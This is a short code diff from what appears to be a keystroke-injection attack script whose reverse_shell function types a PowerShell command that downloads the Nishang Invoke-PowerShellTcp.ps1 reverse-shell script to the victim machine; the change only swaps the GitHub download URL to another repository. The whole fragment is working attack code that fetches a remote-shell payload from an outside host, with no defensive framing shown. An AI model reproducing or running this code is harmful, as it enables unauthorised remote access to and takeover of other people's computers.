@@ -16,7 +16,7 @@ function reverse_shell()
   press("ENTER");  
 
   // download Nishang powershell script
-  type("IWR -Uri 'https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1' -Outfile './r.ps1'");
+  type("IWR -Uri 'https://github.com/leandrodax/PBTec/blob/main/Invoke-PowerShellTcp.ps1' -Outfile './r.ps1'");
   delay(100);
   press("ENTER");
 
